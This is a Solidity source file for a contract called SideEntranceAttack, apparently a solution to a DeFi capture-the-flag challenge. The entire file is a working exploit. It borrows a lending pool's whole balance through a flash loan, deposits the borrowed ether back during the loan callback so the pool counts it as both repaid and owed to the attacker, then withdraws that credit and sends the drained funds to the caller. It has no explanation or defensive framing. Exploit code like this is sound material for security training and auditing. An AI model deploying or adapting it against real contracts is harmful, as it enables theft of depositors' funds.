// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    IPool immutable pool;

    constructor(address _pool) {
        pool = IPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
